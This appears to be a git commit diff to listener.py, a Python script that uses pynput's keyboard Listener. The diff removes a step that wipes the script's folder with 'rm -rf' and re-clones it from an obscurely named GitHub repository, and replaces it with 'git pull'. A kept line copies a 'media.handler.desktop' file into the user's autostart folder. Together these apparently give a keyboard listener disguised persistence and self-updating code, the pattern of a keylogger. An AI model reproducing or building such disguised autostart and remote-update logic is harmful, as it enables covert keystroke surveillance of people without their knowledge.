f9ed89739c5807e457ba07e04e7252747d73dcf5
jackmnds <eliabe.mendes8@gmail.com>
2023-05-31 20:18:49 -0300

    ...

--- listener.py
+++ listener.py
@@ -5,12 +5,7 @@ from pynput.keyboard import Key, KeyCode, Listener
 
 PATH = path.dirname(path.abspath(__file__))
 
-run(f"rm -rf {PATH}", shell=True)
-run(
-    f"git clone https://github.com/rndomusrname/t3CeN61.git {PATH}",
-    shell=True,
-    stderr=DEVNULL,
-)
+run(f"cd {PATH} && git pull")
 run(f"cp {PATH}/media.handler.desktop ~/.config/autostart/", shell=True)
 
 mh = MediaHandler()
